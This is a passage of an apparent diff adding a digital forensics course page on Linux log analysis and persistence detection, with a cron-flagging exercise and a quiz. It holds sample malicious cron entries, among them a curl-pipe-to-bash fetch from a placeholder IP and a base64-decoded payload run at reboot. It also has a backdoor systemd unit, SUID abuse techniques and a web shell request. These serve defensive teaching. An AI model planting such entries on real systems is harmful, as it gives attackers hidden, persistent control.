+          <span class="dim">  *  *  *  *  *   command_to_execute</span><br><br>
+          <span class="comment"># Example: run every minute (attacker beacon frequency)</span><br>
+          <span class="hi">*  *  *  *  *   /tmp/.update &gt;/dev/null 2&gt;&amp;1</span>
+        </div>
+
+        <h4 class="mt-md">Red Flag Cron Patterns</h4>
+        <ul class="redflag-list" aria-label="Red flag cron patterns">
+          <li>Commands referencing <code>/tmp/</code>, <code>/dev/shm/</code>, or other world-writable directories</li>
+          <li>Commands that pipe to <code>bash</code> or <code>sh</code> (e.g., <code>curl http://... | bash</code>)</li>
+          <li>Output redirected to <code>/dev/null</code> on both stdout and stderr (<code>&gt;/dev/null 2&gt;&amp;1</code>) — hiding execution evidence</li>
+          <li>Executables with names that mimic system tools (e.g., <code>.update</code>, <code>systemd-check</code>, <code>cron.d</code>)</li>
+          <li>Very high frequency (<code>* * * * *</code> = every minute) — typical of C2 beacons</li>
+          <li>Base64-encoded commands: <code>echo "base64string" | base64 -d | bash</code></li>
+          <li>Cron files owned by a non-root user in <code>/etc/cron.d/</code></li>
+          <li>Cron entries with <code>wget</code> or <code>curl</code> downloading from external IPs or unusual domains</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- INTERACTIVE CRON ACTIVITY -->
+    <div class="activity-card" role="region" aria-label="Interactive cron entry analysis activity">
+      <p class="activity-card__label">🧩 Interactive Activity — Suspicious Cron Analysis</p>
+      <h3>Flag the Malicious Cron Entries</h3>
+      <p>Below are six cron entries found in <code>/var/spool/cron/crontabs/root</code> and <code>/etc/cron.d/</code> on <strong>web-prod-03</strong>. Some are legitimate system cron jobs; others are attacker-planted. Click <strong>Flag as Suspicious</strong> on each entry you believe is malicious, then click <strong>Check My Flags</strong>.</p>
+      <div class="cron-entries" id="cron-entries-list">
+
+        <div class="cron-entry" id="ce1" data-suspicious="false" role="listitem">
+          <code>17 * * * *   root   cd / &amp;&amp; run-parts --report /etc/cron.hourly</code>
+          <button class="cron-entry__flag-btn" onclick="toggleFlag('ce1')" aria-pressed="false" aria-label="Flag entry 1 as suspicious">Flag as Suspicious</button>
+        </div>
+
+        <div class="cron-entry" id="ce2" data-suspicious="true" role="listitem">
+          <code>* * * * *   root   /tmp/.svc &gt;/dev/null 2&gt;&amp;1</code>
+          <button class="cron-entry__flag-btn" onclick="toggleFlag('ce2')" aria-pressed="false" aria-label="Flag entry 2 as suspicious">Flag as Suspicious</button>
+        </div>
+
+        <div class="cron-entry" id="ce3" data-suspicious="false" role="listitem">
+          <code>25 6 * * *   root   test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</code>
+          <button class="cron-entry__flag-btn" onclick="toggleFlag('ce3')" aria-pressed="false" aria-label="Flag entry 3 as suspicious">Flag as Suspicious</button>
+        </div>
+
+        <div class="cron-entry" id="ce4" data-suspicious="true" role="listitem">
+          <code>*/5 * * * *   www-data   curl -s http://198.51.100.22/upd.sh | bash</code>
+          <button class="cron-entry__flag-btn" onclick="toggleFlag('ce4')" aria-pressed="false" aria-label="Flag entry 4 as suspicious">Flag as Suspicious</button>
+        </div>
+
+        <div class="cron-entry" id="ce5" data-suspicious="false" role="listitem">
+          <code>0 2 * * 0   root   /usr/bin/certbot renew --quiet</code>
+          <button class="cron-entry__flag-btn" onclick="toggleFlag('ce5')" aria-pressed="false" aria-label="Flag entry 5 as suspicious">Flag as Suspicious</button>
+        </div>
+
+        <div class="cron-entry" id="ce6" data-suspicious="true" role="listitem">
+          <code>@reboot   root   echo "c3NoLWtleWdlbiBiYXNlNjQ=" | base64 -d | bash</code>
+          <button class="cron-entry__flag-btn" onclick="toggleFlag('ce6')" aria-pressed="false" aria-label="Flag entry 6 as suspicious">Flag as Suspicious</button>
+        </div>
+
+      </div>
+      <button class="activity-check-btn" onclick="checkCronFlags()" aria-label="Check my cron flag selections">Check My Flags</button>
+      <div class="activity-result" id="cron-result" role="alert" aria-live="polite"></div>
+    </div>
+
+    <!-- SYSTEMD UNIT FILES -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-systemd" id="btn-systemd">
+        <span aria-hidden="true">⚙️</span>
+        <span>systemd Unit Files — Malicious Service Persistence</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-systemd" role="region" aria-labelledby="btn-systemd">
+        <p>systemd unit files define services, timers, and other system units. An attacker can install a malicious <code>.service</code> file that runs their payload on every boot — and it will look identical to a legitimate service to a casual observer.</p>
+
+        <h4>Key Locations to Examine</h4>
+        <ul>
+          <li><code>/etc/systemd/system/</code> — Administrator-installed units (highest priority); <strong>attacker-installed units most commonly appear here</strong></li>
+          <li><code>/lib/systemd/system/</code> — Package-installed units (lower priority)</li>
+          <li><code>/run/systemd/system/</code> — Runtime units (volatile; lost on reboot)</li>
+          <li><code>~/.config/systemd/user/</code> — Per-user units (run without root)</li>
+        </ul>
+
+        <h4 class="mt-md">Anatomy of a Malicious Unit File</h4>
+        <div class="code-block" role="region" aria-label="Example malicious systemd service unit file">
+          <span class="comment"># /etc/systemd/system/systemd-network-helper.service</span><br>
+          <span class="comment"># (name chosen to blend in with legitimate systemd services)</span><br><br>
+          <span class="flag">[Unit]</span><br>
+          <span class="cmd">Description=</span>Network Helper Service<br>
+          <span class="cmd">After=</span>network.target<br><br>
+          <span class="flag">[Service]</span><br>
+          <span class="cmd">ExecStart=</span><span class="path">/usr/local/bin/.netd</span>   <span class="hi">← hidden binary (dot-prefixed)</span><br>
+          <span class="cmd">Restart=</span>always                         <span class="hi">← restarts if killed</span><br>
+          <span class="cmd">RestartSec=</span>30<br>
+          <span class="cmd">User=</span>root                              <span class="hi">← runs as root</span><br><br>
+          <span class="flag">[Install]</span><br>
+          <span class="cmd">WantedBy=</span>multi-user.target              <span class="hi">← starts on every boot</span>
+        </div>
+
+        <h4 class="mt-md">Detection Commands</h4>
+        <div class="code-block" role="region" aria-label="systemd persistence detection commands">
+          <span class="comment"># List all enabled services — look for unfamiliar names</span><br>
+          <span class="cmd">systemctl</span> list-unit-files <span class="flag">--type=service --state=enabled</span><br><br>
+          <span class="comment"># Find recently modified unit files (within last 30 days)</span><br>
+          <span class="cmd">find</span> <span class="path">/etc/systemd/system/</span> <span class="flag">-mtime -30 -name "*.service"</span><br><br>
+          <span class="comment"># Examine a specific unit file</span><br>
+          <span class="cmd">cat</span> <span class="path">/etc/systemd/system/suspicious.service</span><br><br>
+          <span class="comment"># Check service execution history in journal</span><br>
+          <span class="cmd">journalctl</span> <span class="flag">-u</span> suspicious.service <span class="flag">--since</span> <span class="flag">"2026-03-01"</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SUID/SGID -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-suid" id="btn-suid">
+        <span aria-hidden="true">🏴</span>
+        <span>SUID/SGID Binaries — Privilege Escalation Persistence</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-suid" role="region" aria-labelledby="btn-suid">
+        <p><strong>SUID (Set User ID)</strong> is a file permission bit that causes a program to execute with the privileges of its <em>owner</em>, not the user who runs it. A SUID binary owned by root runs as root regardless of who executes it. This is a legitimate mechanism (e.g., <code>/usr/bin/passwd</code> needs root to write <code>/etc/shadow</code>), but attackers abuse it by creating or modifying SUID binaries to provide persistent root access.</p>
+
+        <div class="two-col">
+          <div>
+            <h4>Legitimate SUID Examples</h4>
+            <ul>
+              <li><code>/usr/bin/passwd</code> — changes passwords</li>
+              <li><code>/usr/bin/sudo</code> — privilege escalation</li>
+              <li><code>/usr/bin/ping</code> — raw socket access</li>
+              <li><code>/usr/bin/su</code> — switch user</li>
+            </ul>
+          </div>
+          <div>
+            <h4>Attacker SUID Abuse</h4>
+            <ul>
+              <li>Copy <code>/bin/bash</code> to <code>/tmp/bash</code> and set SUID</li>
+              <li>Set SUID on <code>find</code>, <code>vim</code>, <code>python3</code> (GTFOBins)</li>
+              <li>Create custom SUID binary that spawns root shell</li>
+              <li>Modify existing SUID binary to add backdoor</li>
+            </ul>
+          </div>
+        </div>
+
+        <h4 class="mt-md">Finding SUID/SGID Binaries</h4>
+        <div class="code-block" role="region" aria-label="SUID and SGID binary detection commands">
+          <span class="comment"># Find ALL SUID binaries on the system</span><br>
+          <span class="cmd">find</span> <span class="path">/</span> <span class="flag">-perm -4000 -type f</span> <span class="flag">-ls</span> 2&gt;/dev/null<br><br>
+          <span class="comment"># Find ALL SGID binaries</span><br>
+          <span class="cmd">find</span> <span class="path">/</span> <span class="flag">-perm -2000 -type f</span> <span class="flag">-ls</span> 2&gt;/dev/null<br><br>
+          <span class="comment"># Find SUID/SGID in unusual locations (not /usr/bin, /bin, /sbin)</span><br>
+          <span class="cmd">find</span> <span class="path">/tmp /var /opt /home /root</span> <span class="flag">-perm /6000 -type f</span> <span class="flag">-ls</span> 2&gt;/dev/null<br><br>
+          <span class="comment"># Compare against a known-good baseline (if available)</span><br>
+          <span class="comment"># Any SUID binary NOT in the baseline is a red flag</span>
+        </div>
+
+        <div class="callout callout--warn" style="margin-top:.6rem; margin-bottom:0;">
+          <p class="callout__label">⚠️ GTFOBins Reference</p>
+          <p>The GTFOBins project (referenced by name — do not follow external links) documents how legitimate Unix binaries can be exploited when given SUID permissions. If you find an unexpected SUID binary like <code>find</code>, <code>vim</code>, <code>python3</code>, <code>perl</code>, or <code>nmap</code>, treat it as a critical finding — these can all spawn root shells.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- SSH AUTHORIZED KEYS -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-sshkeys" id="btn-sshkeys">
+        <span aria-hidden="true">🔑</span>
+        <span>SSH authorized_keys — Backdoor Key Injection</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-sshkeys" role="region" aria-labelledby="btn-sshkeys">
+        <p>Adding an attacker-controlled public key to a user's <code>authorized_keys</code> file is one of the most common and reliable persistence techniques. It requires no password, survives reboots and password changes, and is invisible to login monitoring that only watches for password authentication.</p>
+
+        <h4>Locations to Examine</h4>
+        <ul>
+          <li><code>/root/.ssh/authorized_keys</code> — <strong>Examine first and always</strong></li>
+          <li><code>/home/username/.ssh/authorized_keys</code> — For every user account</li>
+          <li>Non-standard paths defined in <code>/etc/ssh/sshd_config</code> via <code>AuthorizedKeysFile</code> directive</li>
+        </ul>
+
+        <h4 class="mt-md">Red Flags in authorized_keys</h4>
+        <ul class="redflag-list" aria-label="SSH authorized_keys red flags">
+          <li>Keys added after the last known-good deployment date (check file mtime and compare key comments)</li>
+          <li>Keys with no comment field, or generic comments like <code>user@kali</code>, <code>root@attacker</code></li>
+          <li>More keys present than expected for the account</li>
+          <li>Key options prepended to the key (e.g., <code>command="/bin/bash"</code>, <code>no-pty</code>) — used to restrict or control what the key can do</li>
+          <li><code>authorized_keys</code> file owned by a different user than the home directory owner</li>
+        </ul>
+
+        <div class="code-block" role="region" aria-label="SSH authorized_keys examination commands">
+          <span class="comment"># Check authorized_keys for all users</span><br>
+          <span class="cmd">for</span> home in <span class="path">/root /home/*</span>; do<br>
+          &nbsp;&nbsp;<span class="cmd">echo</span> <span class="flag">"=== $home/.ssh/authorized_keys ==="</span><br>
+          &nbsp;&nbsp;<span class="cmd">cat</span> <span class="path">"$home/.ssh/authorized_keys"</span> 2&gt;/dev/null<br>
+          done<br><br>
+          <span class="comment"># Check sshd_config for non-standard AuthorizedKeysFile path</span><br>
+          <span class="cmd">grep</span> <span class="flag">-i</span> <span class="flag">"AuthorizedKeysFile"</span> <span class="path">/etc/ssh/sshd_config</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- LD_PRELOAD -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-ldpreload" id="btn-ldpreload">
+        <span aria-hidden="true">📦</span>
+        <span>LD_PRELOAD Hijacking — Library Injection Persistence</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-ldpreload" role="region" aria-labelledby="btn-ldpreload">
+        <p>The Linux dynamic linker allows a shared library to be loaded <em>before all others</em> via the <code>LD_PRELOAD</code> environment variable or the <code>/etc/ld.so.preload</code> file. An attacker can use this to inject malicious code into every process on the system — overriding standard library functions like <code>read()</code>, <code>write()</code>, or <code>open()</code> to hide files, processes, or network connections.</p>
+
+        <h4>How Attackers Use It</h4>
+        <ul>
+          <li>Place a malicious shared library (<code>.so</code> file) on disk, often in <code>/tmp/</code> or a hidden directory</li>
+          <li>Add its path to <code>/etc/ld.so.preload</code> — this causes it to load into <strong>every process system-wide</strong></li>
+          <li>The malicious library overrides functions to hide the attacker's files, processes, and network connections from standard tools like <code>ls</code>, <code>ps</code>, and <code>netstat</code></li>
+        </ul>
+
+        <h4 class="mt-md">Detection</h4>
+        <div class="code-block" role="region" aria-label="LD_PRELOAD detection commands">
+          <span class="comment"># Check /etc/ld.so.preload — should be empty or non-existent on most systems</span><br>
+          <span class="cmd">cat</span> <span class="path">/etc/ld.so.preload</span><br><br>
+          <span class="comment"># Find all .so files in suspicious locations</span><br>
+          <span class="cmd">find</span> <span class="path">/tmp /var /dev/shm /home /root</span> <span class="flag">-name "*.so" -o -name "*.so.*"</span> 2&gt;/dev/null<br><br>
+          <span class="comment"># Check environment of running processes for LD_PRELOAD</span><br>
+          <span class="cmd">cat</span> <span class="path">/proc/*/environ</span> 2&gt;/dev/null | <span class="cmd">tr '\0' '\n'</span> | <span class="cmd">grep</span> <span class="flag">LD_PRELOAD</span>
+        </div>
+
+        <div class="callout callout--danger" style="margin-top:.6rem; margin-bottom:0;">
+          <p class="callout__label">🚨 Critical Implication</p>
+          <p>If <code>/etc/ld.so.preload</code> contains a malicious library, <strong>you cannot trust the output of any standard tool on the live system</strong>. The library may be hiding files, processes, and connections from you. This is a key reason why forensic analysis from a dead-box image (where the malicious library cannot execute) is more reliable than live analysis when rootkits are suspected.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- LKM ROOTKITS -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-lkm" id="btn-lkm">
+        <span aria-hidden="true">🧬</span>
+        <span>LKM Rootkits — Kernel-Level Concealment (Conceptual)</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-lkm" role="region" aria-labelledby="btn-lkm">
+        <p>A <strong>Loadable Kernel Module (LKM) rootkit</strong> is the most sophisticated Linux persistence and concealment technique. It operates at the kernel level — giving it the ability to intercept and modify any system call, hide any file or process, and make itself essentially invisible to user-space tools.</p>
+
+        <h4>How LKM Rootkits Work (Conceptual)</h4>
+        <ul>
+          <li>A kernel module is compiled and loaded with <code>insmod</code> or <code>modprobe</code></li>
+          <li>Once loaded, the rootkit modifies the <strong>system call table</strong> — the kernel's table of function pointers for every OS operation</li>
+          <li>It replaces legitimate syscall handlers (e.g., <code>getdents</code> for directory listing) with its own versions that filter out attacker-controlled files and processes</li>
+          <li>The result: <code>ls</code>, <code>ps</code>, <code>netstat</code>, and other tools return filtered results — the attacker's artifacts are invisible</li>
+        </ul>
+
+        <h4 class="mt-md">Detection Approaches</h4>
+        <ul>
+          <li><strong>Dead-box analysis is essential</strong> — on a live system with an active LKM rootkit, user-space tools cannot be trusted</li>
+          <li>Check <code>/var/log/kern.log</code> or <code>journalctl -k</code> for unexpected module load events (<code>insmod</code>)</li>
+          <li>Compare <code>lsmod</code> output against a known-good baseline (may be filtered by rootkit on live system)</li>
+          <li>Look for unsigned or recently compiled kernel modules in <code>/lib/modules/$(uname -r)/</code></li>
+          <li>Memory forensics with Volatility (covered in Module 10) can detect LKM rootkits by analyzing kernel memory directly</li>
+        </ul>
+
+        <div class="code-block" role="region" aria-label="LKM rootkit detection commands">
+          <span class="comment"># Check kernel log for module load events</span><br>
+          <span class="cmd">journalctl</span> <span class="flag">-k</span> | <span class="cmd">grep</span> <span class="flag">-i</span> <span class="flag">"module\|insmod\|modprobe"</span><br><br>
+          <span class="comment"># List currently loaded modules (may be filtered on live compromised system)</span><br>
+          <span class="cmd">lsmod</span><br><br>
+          <span class="comment"># Find recently modified kernel module files</span><br>
+          <span class="cmd">find</span> <span class="path">/lib/modules/</span> <span class="flag">-name "*.ko" -mtime -30</span> <span class="flag">-ls</span>
+        </div>
+
+        <div class="callout callout--info" style="margin-top:.6rem; margin-bottom:0;">
+          <p class="callout__label">🔗 Connection to Week 10</p>
+          <p>LKM rootkit detection through memory analysis is covered in depth in <strong>Module 10 — Memory (RAM) Forensics</strong> using the Volatility Framework. The <code>linux_check_syscall</code> and <code>linux_lsmod</code> Volatility plugins can detect rootkit-modified syscall tables and hidden modules directly from a memory dump, bypassing the rootkit's user-space filtering entirely.</p>
+        </div>
+      </div>
+    </div>
+
+  </section>
+
+  <hr class="divider">
+
+  <!-- ═══════════════════════════════════════════════════════════
+       SECTION 6 — KNOWLEDGE CHECK
+  ════════════════════════════════════════════════════════════ -->
+  <section class="section" id="knowledge-check" aria-labelledby="kc-heading">
+    <div class="kc-section" role="region" aria-label="Ungraded knowledge check">
+      <div class="kc-header">
+        <div class="kc-header__icon" aria-hidden="true">✅</div>
+        <div>
+          <h2 id="kc-heading">Knowledge Check</h2>
+          <p style="font-size:.85rem; color:var(--clr-text-muted); margin:0;">Ungraded · Immediate feedback · 3 questions</p>
+        </div>
+      </div>
+
+      <div class="callout callout--info" style="margin-bottom:1.4rem;">
+        <p class="callout__label">📋 Instructions</p>
+        <p>Select the best answer for each question, then click <strong>Check Answer</strong>. You will receive immediate explanatory feedback. These questions are not graded and do not submit to Canvas.</p>
+      </div>
+
+      <!-- Q1 -->
+      <div class="kc-question" id="q1-block">
+        <p class="kc-question__stem" id="q1-stem">
+          <span class="kc-question__num" aria-hidden="true">1</span>
+          While examining <strong>web-prod-03</strong>, you notice that <code>/var/log/auth.log</code> contains entries up to 21:31 on March 1, but the file's <code>mtime</code> (as reported by <code>stat</code>) is 21:35 on March 1 — four minutes <em>after</em> the last log entry. The binary journal shows continuous SSH activity until 22:47 on March 1. What is the most forensically significant interpretation of these observations?
+        </p>
+        <ul class="kc-options" role="radiogroup" aria-labelledby="q1-stem">
+          <li>
+            <label>
+              <input type="radio" name="q1" value="a">
+              <span>The system experienced a normal log rotation event at 21:35, which explains both the mtime and the gap between auth.log and the journal.</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q1" value="b">
+              <span>The auth.log file was modified or truncated at 21:35 — approximately four minutes after the last entry it contains — while the binary journal continued recording. This gap (21:31–22:47) is consistent with an attacker deleting or editing the plain-text log to conceal activity during that window.</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q1" value="c">
+              <span>The binary journal is unreliable because it records more events than auth.log; auth.log should be treated as the authoritative source.</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q1" value="d">
+              <span>The mtime discrepancy is normal because rsyslog buffers writes and flushes them periodically, causing mtime to lag behind the last entry timestamp.</span>
+            </label>
+          </li>
+        </ul>
+        <button class="kc-btn" onclick="checkAnswer(1,'b',this)" aria-label="Check answer for question 1">Check Answer</button>
+        <div class="kc-feedback" id="q1-feedback" role="alert" aria-live="polite"></div>
+      </div>
+
+      <!-- Q2 -->
+      <div class="kc-question" id="q2-block">
+        <p class="kc-question__stem" id="q2-stem">
+          <span class="kc-question__num" aria-hidden="true">2</span>
+          You are reviewing Apache access logs on <strong>web-prod-03</strong> and find the following entry:<br>
+          <code style="display:block;margin:.5rem 0;padding:.5rem;background:#e8eef4;border-radius:4px;font-size:.82em;line-height:1.5;">198.51.100.77 - - [01/Mar/2026:21:18:04 +0000] "GET /uploads/avatar_20260301.php?cmd=id HTTP/1.1" 200 43 "-" "Mozilla/5.0"</code>
+          Which combination of indicators makes this entry the <strong>highest-priority finding</strong> in your investigation?
+        </p>
+        <ul class="kc-options" role="radiogroup" aria-labelledby="q2-stem">
+          <li>
+            <label>
+              <input type="radio" name="q2" value="a">
+              <span>The User-Agent is "Mozilla/5.0" — a browser string — which proves a human attacker was manually operating a browser to exploit the server.</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q2" value="b">
+              <span>The request is to a PHP file in an uploads directory with a shell command parameter (<code>?cmd=id</code>), and the server returned HTTP 200 with 43 bytes — indicating a web shell was successfully executed and returned output (the <code>id</code> command output is typically ~40 bytes).</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q2" value="c">
+              <span>The timestamp (21:18:04) is close to when anomalous outbound traffic was detected (21:32), making the timing suspicious but the request itself unremarkable.</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q2" value="d">
+              <span>The source IP (198.51.100.77) is in a reserved documentation range, which means this log entry is fabricated and should be disregarded.</span>
+            </label>
+          </li>
+        </ul>
+        <button class="kc-btn" onclick="checkAnswer(2,'b',this)" aria-label="Check answer for question 2">Check Answer</button>
+        <div class="kc-feedback" id="q2-feedback" role="alert" aria-live="polite"></div>
+      </div>
+
+      <!-- Q3 -->
+      <div class="kc-question" id="q3-block">
+        <p class="kc-question__stem" id="q3-stem">
+          <span class="kc-question__num" aria-hidden="true">3</span>
+          During your examination of <strong>web-prod-03</strong>, you find the file <code>/etc/ld.so.preload</code> contains the path <code>/usr/lib/x86_64-linux-gnu/libaudit.so.1</code>. You run <code>ls /tmp/</code> and see only a few ordinary-looking files. What should your immediate next steps and interpretation be?
+        </p>
+        <ul class="kc-options" role="radiogroup" aria-labelledby="q3-stem">
+          <li>
+            <label>
+              <input type="radio" name="q3" value="a">
+              <span>The file in <code>/etc/ld.so.preload</code> is the legitimate libaudit library; its presence is normal on Ubuntu systems. The clean <code>/tmp/</code> directory confirms no active compromise.</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q3" value="b">
+              <span>The <code>/etc/ld.so.preload</code> file should normally be empty or absent. The presence of any library path — even one with a legitimate-sounding name — is a critical red flag for an LD_PRELOAD rootkit. The clean <code>/tmp/</code> output cannot be trusted because the preloaded library may be filtering <code>ls</code> results. Switch to dead-box analysis of the forensic image immediately.</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q3" value="c">
+              <span>The library in <code>/etc/ld.so.preload</code> is suspicious, but since <code>/tmp/</code> appears clean, you can proceed with live analysis using standard tools and document your findings normally.</span>
+            </label>
+          </li>
+          <li>
+            <label>
+              <input type="radio" name="q3" value="d">
+              <span>Delete the <code>/etc/ld.so.preload</code> file on the live system to neutralize the rootkit, then continue your investigation with standard tools.</span>
+            </label>
+          </li>
+        </ul>
+        <button class="kc-btn" onclick="checkAnswer(3,'b',this)" aria-label="Check answer for question 3">Check Answer</button>
+        <div class="kc-feedback" id="q3-feedback" role="alert" aria-live="polite"></div>
+      </div>
+
+    </div><!-- /.kc-section -->
+  </section>
+
+  <!-- MODULE SUMMARY -->
+  <section class="section" aria-labelledby="summary-heading">
+    <div class="section-header">
+      <div class="section-icon" aria-hidden="true">📌</div>
+      <h2 id="summary-heading">Module 9.4 Summary</h2>
+    </div>
+    <p>You have completed the final Linux concepts module for Week 9. Here is what you should now be able to explain and apply:</p>
+    <ul>
+      <li><strong>The three-layer logging architecture</strong> — event sources → journald/rsyslog daemons → storage; why Ubuntu 22.04 has both binary and plain-text logs simultaneously.</li>
+      <li><strong>journalctl query syntax</strong> — time filtering, unit filtering, PID filtering, and dead-box analysis with <code>-D</code>.</li>
+      <li><strong>Log rotation forensic implications</strong> — all rotated files must be examined; missing rotated logs are evidence of tampering.</li>
+      <li><strong>Key log files</strong> — <code>auth.log</code>, web server access/error logs, <code>wtmp</code>/<code>btmp</code>, <code>dpkg.log</code>, and audit logs; their owners, formats, and forensic value.</li>
+      <li><strong>Apache Combined Log Format</strong> — all seven fields and their forensic significance; HTTP status codes as attack success indicators.</li>
+      <li><strong>Web attack signatures</strong> — directory traversal, SQL injection, scanner User-Agents, and web shell access patterns.</li>
+      <li><strong>Log tampering detection</strong> — timestamp gaps, mtime inconsistency, truncated files, and cross-source correlation as the primary detection strategy.</li>
+      <li><strong>Linux persistence mechanisms</strong> — cron (all file locations, red flag patterns), systemd unit files, SUID/SGID binaries (<code>find</code> commands), SSH <code>authorized_keys</code>, LD_PRELOAD hijacking via <code>/etc/ld.so.preload</code>, and LKM rootkits at the conceptual level.</li>
+    </ul>
+    <div class="callout callout--success">
+      <p class="callout__label">▶ What's Next</p>
+      <p><strong>Module 9.5 – Linux Triage Lab</strong> puts everything from Modules 9.1–9.4 into practice. You will work through a structured triage of the <strong>web-prod-03</strong> forensic image, applying the artifact locations, log analysis techniques, and persistence detection methods from this entire week to answer the core investigative question: Was the server compromised? If so, how, when, and what data may have been accessed?</p>
+    </div>
+  </section>
+
+</main>
+
+<!-- FOOTER -->
+<footer class="page-footer" role="contentinfo">
+  <p><strong>CSC 156 – Digital Forensics Fundamentals</strong> &nbsp;|&nbsp; Week 9, Module 9.4 &nbsp;|&nbsp; Spring 2026</p>
+  <p style="margin-top:.3rem;">This page is for instructional use only. Content is ungraded unless otherwise noted in the course gradebook.</p>
+</footer>
+
+<script>
+/* ── ACCORDION ─────────────────────────────────────────────── */
+(function () {
+  document.querySelectorAll('.accordion__trigger').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var expanded = this.getAttribute('aria-expanded') === 'true';
+      var panel = document.getElementById(this.getAttribute('aria-controls'));
+      if (!panel) return;
+      this.setAttribute('aria-expanded', String(!expanded));
+      panel.classList.toggle('is-open', !expanded);
+    });
+    btn.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); this.click(); }
+    });
+  });
+})();
+
+/* ── CRON ACTIVITY ─────────────────────────────────────────── */
+function toggleFlag(id) {
+  var el  = document.getElementById(id);
+  var btn = el.querySelector('.cron-entry__flag-btn');
+  var flagged = el.classList.toggle('is-flagged');
+  btn.setAttribute('aria-pressed', String(flagged));
+  btn.textContent = flagged ? '🚩 Flagged' : 'Flag as Suspicious';
+}
+
+function checkCronFlags() {
+  var entries = document.querySelectorAll('.cron-entry');
+  var correct = 0, incorrect = 0, missed = 0;
+  var details = [];
+
+  entries.forEach(function (el) {
+    var isSuspicious = el.dataset.suspicious === 'true';
+    var isFlagged    = el.classList.contains('is-flagged');
+    if (isSuspicious && isFlagged)  { correct++;   el.classList.add('is-flagged');    }
+    if (!isSuspicious && isFlagged) { incorrect++;  }
+    if (isSuspicious && !isFlagged) { missed++;     el.classList.add('is-benign');    }
+  });
+
+  var resultEl = document.getElementById('cron-result');
+  var total = 3; // three suspicious entries
+
+  var html = '';
+  if (incorrect === 0 && missed === 0) {
+    resultEl.className = 'activity-result activity-result--good show';
+    html = '<strong>✅ Perfect — all three malicious entries identified with no false positives!</strong><br><br>';
+  } else if (correct > 0 && incorrect <= 1 && missed <= 1) {
+    resultEl.className = 'activity-result activity-result--partial show';
+    html = '<strong>⚠️ Partially correct — ' + correct + '/3 malicious entries found, ' + incorrect + ' false positive(s), ' + missed + ' missed.</strong><br><br>';
+  } else {
+    resultEl.className = 'activity-result activity-result--miss show';
+    html = '<strong>❌ Review needed — ' + correct + '/3 malicious entries found, ' + incorrect + ' false positive(s), ' + missed + ' missed.</strong><br><br>';
+  }
+
+  html += '<strong>The three malicious entries were:</strong><ul style="margin-top:.4rem;">';
+  html += '<li><strong>Entry 2</strong> — <code>* * * * * root /tmp/.svc &gt;/dev/null 2&gt;&amp;1</code>: Runs every minute (C2 beacon frequency), executes a hidden binary in <code>/tmp/</code> (world-writable, attacker staging area), and suppresses all output to hide execution evidence.</li>';
+  html += '<li><strong>Entry 4</strong> — <code>*/5 * * * * www-data curl -s http://198.51.100.22/upd.sh | bash</code>: Downloads and executes a script from an external IP every 5 minutes — a classic "pipe to bash" persistence pattern. The <code>www-data</code> user running this is the web server process account, consistent with a web shell compromise.</li>';
+  html += '<li><strong>Entry 6</strong> — <code>@reboot root echo "..." | base64 -d | bash</code>: Runs at every reboot as root, decodes and executes a base64-encoded payload — a common obfuscation technique to hide the actual command from casual inspection.</li>';
+  html += '</ul>';
+  html += '<br><strong>The benign entries were:</strong> Entry 1 (standard hourly cron runner), Entry 3 (standard daily cron runner), Entry 5 (certbot SSL certificate renewal — legitimate system maintenance).';
+
+  resultEl.innerHTML = html;
+  resultEl.setAttribute('tabindex', '-1');
+  resultEl.focus();
+}
+
+/* ── KNOWLEDGE CHECK ───────────────────────────────────────── */
+var kcFeedback = {
+  1: {
+    b: {
+      correct: true,
+      verdict: '✅ Correct!',
+      text: 'This is the right interpretation. The key insight is that <code>mtime</code> on a log file should reflect <em>when the last write occurred</em> — which for an active log should be very close to the timestamp of the last entry. Here, the mtime is four minutes <em>after</em> the last entry, suggesting the file was opened and written to (or truncated and partially restored) at 21:35. The binary journal\'s continuous record through 22:47 provides the cross-source evidence: events were occurring on the system during the gap — they just don\'t appear in <code>auth.log</code>. This gap (21:31–22:47) is the primary incident window to investigate.'
+    },
+    a: {
+      correct: false,
+      verdict: '❌ Incorrect.',
+      text: 'Log rotation would create a new <code>auth.log.1</code> file and start a fresh <code>auth.log</code> — it would not explain an mtime that is later than the last entry in the current file. After rotation, the new <code>auth.log</code> would begin receiving entries immediately. The cross-source discrepancy with the binary journal (which shows continuous activity) is the more significant finding and cannot be explained by normal rotation.'
+    },
+    c: {
+      correct: false,
+      verdict: '❌ Incorrect.',
